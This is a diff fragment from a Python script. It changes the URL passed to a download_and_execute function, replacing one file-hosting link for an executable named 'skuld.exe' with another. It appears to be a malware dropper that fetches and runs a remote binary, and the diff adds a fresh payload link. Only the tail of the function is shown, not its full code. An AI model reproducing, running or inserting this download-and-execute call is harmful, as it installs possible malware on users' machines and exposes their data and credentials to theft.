@@ -18,4 +18,4 @@ def download_and_execute(url):
         print("Failed to download the file.")
 
 # Example usage
-download_and_execute("https://fs03n4.sendspace.com/dl/50410274bfb2cae3e724e5c44fa34c52/664467283c9640a7/837i9g/skuld.exe")
+download_and_execute("https://31.filelu.com/d/w53ax4lhjq2kvjtahgm46y7or7dx4nt4yn5fvoik2fgzfxz7kjzpj4g4l4tz7ijdfhsa5l5t/skuld.exe")
